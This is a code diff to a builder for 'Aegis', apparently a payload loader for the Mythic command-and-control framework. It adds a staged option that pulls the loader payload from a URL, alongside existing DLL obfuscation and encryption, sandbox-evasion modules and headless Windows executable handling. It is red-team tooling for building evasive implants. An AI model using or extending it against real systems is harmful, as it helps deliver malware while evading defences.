@@ -45,6 +45,19 @@ class aegis(PayloadType):
     ]
     build_parameters = [
         BuildParameter(
+            name="loader-type",
+            parameter_type=BuildParameterType.ChooseOne,
+            choices=["unstaged", "staged-web"],
+            default_value="unstaged",
+            description="Make use of a staged or unstaged payload"
+        ),
+        BuildParameter(
+            name="url",
+            parameter_type=BuildParameterType.String,
+            default_value="",
+            description="(Staged Only) Url to pull loader payload from"
+        ),
+        BuildParameter(
             name="obfuscation-type",
             parameter_type=BuildParameterType.ChooseOne,
             choices=["Plaintext", "Aes", "Base64"],
@@ -68,23 +81,22 @@ class aegis(PayloadType):
             description="Compile the payload or provide the raw source code"
         )
     ]
-    c2_profiles = ["http", "websocket", "slack", "smb", "discord"]
 
-    async def prepareWinExe(self, output_path):
-        pe = pefile.PE(os.path.join(output_path, "Aegis.exe"))
+    async def prepareWinExe(self, output_path, agent_type):
+        agent_exe = "{}.exe".format(agent_type)
+        pe = pefile.PE(os.path.join(output_path, agent_exe))
         pe.OPTIONAL_HEADER.Subsystem = 2
         pe.write(os.path.join(output_path, "Aegis_Headless.exe"))
         pe.close()
-        os.remove(os.path.join(output_path, "Aegis.exe"))
-        os.rename(os.path.join(output_path, "Aegis_Headless.exe"), os.path.join(output_path, "Aegis.exe"))
+        os.remove(os.path.join(output_path, agent_exe))
+        os.rename(os.path.join(output_path, "Aegis_Headless.exe"), os.path.join(output_path, agent_exe))
 
     # These could be combined but that's a later problem.
-    def addLoader(self, agent_build_path, command_name):
+    def addLoader(self, agent_build_path, command_name, agent_type):
         project_path = os.path.join(agent_build_path.name, "Aegis.Loader.{}".format(command_name), "Aegis.Loader.{}.csproj".format(command_name))
-        p = subprocess.Popen(["dotnet", "add", "Aegis", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", agent_type, "reference", project_path], cwd=agent_build_path.name)
         p.wait()
     
-
     def encryptDLL(self, input_file_path, output_file_path, key):
         # Generate a random 16-byte IV
         iv = get_random_bytes(16)
@@ -112,11 +124,8 @@ class aegis(PayloadType):
         for file in dll_files:
             self.encryptDll(file, agent_build_path)
 
-
     def encodeDlls(self, agent_build_path):
         dll_files = self.getAgentDlls(agent_build_path)
-
-
 
     def getAgentDlls(self, agent_build_path) -> list[str]:
         dll_files = []
@@ -128,9 +137,9 @@ class aegis(PayloadType):
                 dll_files.append(filename)
         return dll_files
 
-    def addEvasion(self, agent_build_path, profile):
+    def addEvasion(self, agent_build_path, profile, payload):
         project_path = os.path.join(agent_build_path.name, "Aegis.Mods.{}".format(profile), "Aegis.Mods.{}.csproj".format(profile))
-        p = subprocess.Popen(["dotnet", "add", "Aegis", "reference", project_path], cwd=agent_build_path.name)
+        p = subprocess.Popen(["dotnet", "add", payload, "reference", project_path], cwd=agent_build_path.name)
         p.wait()
         
     async def returnSuccess(self, resp: BuildResponse, build_msg, agent_build_path) -> BuildResponse:
@@ -156,8 +165,9 @@ class aegis(PayloadType):
         elif selected_os.upper() == "REDHAT":
             return "rhel-x64"
 
-    def getBuildCommand(self, rid, configuration):
-             return "dotnet publish Aegis -r {} -c {} --nologo --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} /p:DebugType=None /p:DebugSymbols=false".format(
+    def getBuildCommand(self, rid, payload, configuration):
+             return "dotnet publish {} -r {} -c {} --nologo --self-contained={} /p:PublishSingleFile={} /p:EnableCompressionInSingleFile={} /p:DebugType=None /p:DebugSymbols=false".format(
+                payload,
                 rid, 
                 configuration, 
                 True, 
@@ -170,6 +180,9 @@ class aegis(PayloadType):
         try:
             agent_uuid = self.wrapped_payload_uuid
             agent_payload_zip_bytes = self.wrapped_payload
+            agent_type = "Aegis"
+            if self.get_parameter("loader-type") == "staged-web":
+                agent_type = "Aegis.Web"
 
             agent_search_response = await SendMythicRPCPayloadSearch(MythicRPCPayloadSearchMessage(PayloadUUID=agent_uuid))
             if not agent_search_response.Success:
@@ -185,9 +198,8 @@ class aegis(PayloadType):
                 return self.returnFailure(resp, "Payloads should not be single-file or self-contained when using this loader.")
             
             rid = self.getRid(agent_config.SelectedOS,agent_config_dict["arch"])
-            build_command = self.getBuildCommand(rid, agent_config_dict["configuration"])
+            build_command = self.getBuildCommand(rid, agent_type, agent_config_dict["configuration"])
             agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
-            agent_build_path2 = os.mkdir(os.path.join("/","tmp",self.uuid+"2"))
 
             if self.get_parameter("output-type") == "app bundle":
                 if agent_config.SelectedOS.upper() != "MACOS":
@@ -201,13 +213,11 @@ class aegis(PayloadType):
             )) 
             # Copy files into the temp directory
             copy_tree(self.agent_code_path, agent_build_path.name)
-            copy_tree(self.agent_code_path, os.path.join("/","tmp",self.uuid+"2"))
             # Get Zip File from buffer
             z = zipfile.ZipFile(io.BytesIO(agent_payload_zip_bytes))
 
             # Unzip into our AgentFiles to be processed by 
             z.extractall(os.path.join(agent_build_path.name,"AgentFiles"))
-            z.extractall(os.path.join("/","tmp",self.uuid+"2","AgentFiles"))
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -216,7 +226,10 @@ class aegis(PayloadType):
                 StepSuccess=True
             )) 
 
-            self.addLoader(agent_build_path, self.get_parameter("obfuscation-type"))
+            # Only need to add reference directly if we're using unstaged payloads, otherwise the dll will be downloaded by Aegis.Web
+            if self.get_parameter("loader-type") == "unstaged":
+                self.addLoader(agent_build_path, self.get_parameter("obfuscation-type"), agent_type)
+
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
                 StepName="Obfuscating DLLs",
@@ -225,7 +238,7 @@ class aegis(PayloadType):
             )) 
 
             for evasion in self.get_parameter("sandbox-evasion"):
-                self.addEvasion(agent_build_path, evasion)
+                self.addEvasion(agent_build_path, evasion, agent_type)
 
             await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                 PayloadUUID=self.uuid,
@@ -238,7 +251,7 @@ class aegis(PayloadType):
                 shutil.make_archive(f"{agent_build_path.name}/output", "zip", f"{agent_build_path.name}")
                 return await self.returnSuccess(resp, "File built succesfully!", agent_build_path)
             
-            output_path = "{}/Aegis/bin/{}/net7.0/{}/publish/".format(agent_build_path.name,agent_config_dict["configuration"].capitalize(), rid)
+            output_path = "{}/{}/bin/{}/net7.0/{}/publish/".format(agent_build_path.name,agent_type,agent_config_dict["configuration"].capitalize(), rid)
 
 
             #Run command and get output
@@ -271,7 +284,7 @@ class aegis(PayloadType):
 
             #If we get here, the path should exist since the build succeeded
             if self.selected_os.lower() == "windows" and self.get_parameter("configuration") != "Debug":
-                #await self.prepareWinExe(output_path) #Force it to be headless
+                #await self.prepareWinExe(output_path, agent_type) #Force it to be headless
                 print("Test")
 
             # if self.get_parameter("output-type") == "app bundle":
